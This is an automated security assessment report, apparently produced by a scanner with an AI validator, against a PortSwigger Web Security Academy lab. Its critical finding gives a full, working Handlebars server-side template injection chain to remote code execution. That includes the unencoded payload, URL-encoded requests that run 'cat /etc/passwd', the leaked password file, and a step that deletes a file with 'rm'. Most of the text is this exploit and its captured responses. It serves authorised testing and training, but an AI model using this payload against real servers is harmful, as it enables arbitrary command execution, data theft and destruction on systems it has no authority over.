# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Unauthenticated RCE via Server-Side Template Injection (Handlebars) in `message` parameter](#finding-1)
    - [2. HIGH — burp✓ Input returned in response (reflected)](#finding-2)
    - [3. LOW — burp Strict transport security not enforced (3 URLs)](#finding-3)
    - [4. INFO — burp TLS certificate](#finding-4)
    - [5. INFO — burp Cacheable HTTPS response](#finding-5)
    - [6. INFO — burp Cross-domain Referer leakage](#finding-6)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [7. MEDIUM — xss-reflected Suspected Reflected XSS in `message` parameter (filter present, bypasses neutralized)](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr6fzspi-e1nxcr` |
| Target | https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/ |
| Started | 2026-07-04T14:13:14.942Z |
| Generated | 2026-07-04T15:43:10.651Z |
| Phase | report |
| Screens | 8 mapped · 8 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 1 critical, 1 high, 1 low, 3 info

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Unauthenticated RCE via Server-Side Template Injection (Handlebars) in `message` parameter

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0af900eb04ef544580cfe567008600ae.web-security-academy.net/

The `message` query parameter on `/` (the product "out of stock" message, reached via the 302 from `/product?productId=N`) is rendered server-side through the Handlebars template engine (Node.js v19.8.1) WITHOUT sandboxing. A fuzz payload (`${{<%[%'"}}%\`) returned HTTP 500 with a full stack trace disclosing the engine: `/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js — Error: Parse error on line 1`. Handlebars is not sandboxed here, so the documented `#with`/`lookup constructor` gadget chain reaches `String.prototype.constructor` (the Function constructor) and builds an attacker function body of `return require('child_process').execSync('<cmd>')`, yielding arbitrary OS command execution as the app user. No authentication is required, and the output of the executed command is reflected back in the rendered page (output-based confirmation). Impact: full remote code execution — arbitrary file read (proved by leaking /etc/passwd, marker root:x:0:0:), arbitrary file deletion (the objective file /home/carlos/morale.txt was deleted and the lab flipped to "Solved"), and complete server compromise.

**Reproduction**

```
1. Fingerprint: GET /?message=${{<%[%'"}}%\ (URL-encoded) → HTTP 500 stack trace naming handlebars + Node v19.8.1.
2. Negative control (ev-mr6i8gt1-2p): GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock → HTTP 200, no command output (body 11586).
3. Positive replays 1 (ev-mr6i8l89-2q) & 2 (ev-mr6i915z-2r): GET / with the Handlebars gadget chain whose inner payload is `return require('child_process').execSync('cat /etc/passwd');` → HTTP 200, body 13934, containing `root:x:0:0:` (leaked /etc/passwd), identical across both replays.
4. Objective (evidence ev-mr6i9nf9-2s): same chain with `execSync('rm /home/carlos/morale.txt')` → HTTP 200; reloading / then shows lab status "Solved — Congratulations, you solved the lab!", proving the file was deleted via RCE.
Payload (unencoded): wrtz{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('CMD');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

**Evidence**

- Evidence `ev-mr6i8gt1-2p` — `artifacts/_/ev-mr6i8gt1-2p/`

Request:

```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 11586
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>Unfortunately this product is out of stock
</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6i8l89-2q` — `artifacts/_/ev-mr6i8l89-2q/`

Request:

```http
GET /?message=wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7B%23with%20%22e%22%7D%7D%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27cat%20%2Fetc%2Fpasswd%27%29%3B%22%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23each%20conslist%7D%7D%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%7B%7Bthis%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Feach%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 13934
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>wrtze2[object Object]function Function() { [native code] }2[object Object]root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false

</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/15.jpg">
                            <h3>Pet Experience Days</h3>
                            <img src="/resources/images/rating5.png">
                            $45.52
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/36.jpg">
                            <h3>Caution Sign</h3>
                            <img src="/resources/images/rating4.png">
                            $23.82
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating4.png">
                            $87.83
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating2.png">
                            $83.15
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/48.jpg">
                            <h3>BBQ Suitcase</h3>
                            <img src="/resources/images/rating1.png">
                            $50.18
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/9.jpg">
                            <h3>Fur Babies</h3>
                            <img src="/resources/images/rating2.png">
                            $92.02
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/6.jpg">
                            <h3>Com-Tool</h3>
                            <img src="/resources/images/rating1.png">
                            $92.44
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/73.jpg">
                            <h3>Beat the Vacation Traffic</h3>
                            <img src="/resources/images/rating4.png">
                            $69.51
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $76.89
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/29.jpg">
                            <h3>Waterproof Tea Bags</h3>
                            <img src="/resources/images/rating1.png">
                            $65.86
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/42.jpg">
                            <h3>Pest Control Umbrella</h3>
                            <img src="/resources/images/rating3.png">
                            $28.31
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/58.jpg">
                            <h3>There is No &apos;I&apos; in Team</h3>
                            <img src="/resources/images/rating2.png">
                            $60.69
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/75.jpg">
                            <h3>Grow Your Own Spy Kit</h3>
                            <img src="/resources/images/rating1.png">
                            $90.96
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating4.png">
                            $62.09
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating1.png">
                            $2.44
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/56.jpg">
                            <h3>More Than Just Birdsong</h3>
                            <img src="/resources/images/rating5.png">
                            $71.65
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/37.jpg">
                            <h3>The Giant Enter Key</h3>
                            <img src="/resources/images/rating4.png">
                            $25.01
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/51.jpg">
                            <h3>Real Life Photoshopping</h3>
                            <img src="/resources/images/rating2.png">
                            $30.87
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating1.png">
                            $44.03
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6i915z-2r` — `artifacts/_/ev-mr6i915z-2r/`

Request:

```http
GET /?message=wrtz%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%7B%7B%23with%20%22e%22%7D%7D%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%28lookup%20string.sub%20%22constructor%22%29%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23with%20string.split%20as%20%7Ccodelist%7C%7D%7D%7B%7Bthis.pop%7D%7D%7B%7Bthis.push%20%22return%20require%28%27child_process%27%29.execSync%28%27cat%20%2Fetc%2Fpasswd%27%29%3B%22%7D%7D%7B%7Bthis.pop%7D%7D%7B%7B%23each%20conslist%7D%7D%7B%7B%23with%20%28string.sub.apply%200%20codelist%29%7D%7D%7B%7Bthis%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Feach%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D%7B%7B%2Fwith%7D%7D HTTP/1.1
Host: 0af900eb04ef544580cfe567008600ae.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 13934
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='RGVsZXRlIHRoZSBmaWxlIDxjb2RlPi9ob21lL2Nhcmxvcy9tb3JhbGUudHh0PC9jb2RlPi4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3NlcnZlci1zaWRlLXRlbXBsYXRlLWluamVjdGlvbi9leHBsb2l0aW5nL2xhYi1zZXJ2ZXItc2lkZS10ZW1wbGF0ZS1pbmplY3Rpb24taW4tYW4tdW5rbm93bi1sYW5ndWFnZS13aXRoLWEtZG9jdW1lbnRlZC1leHBsb2l0'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <div>wrtze2[object Object]function Function() { [native code] }2[object Object]root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:107:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
mongodb:x:110:117::/var/lib/mongodb:/usr/sbin/nologin
avahi:x:111:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:112:119:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
geoclue:x:113:120::/var/lib/geoclue:/usr/sbin/nologin
saned:x:114:122::/var/lib/saned:/usr/sbin/nologin
colord:x:115:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false

</div>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $98.34
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
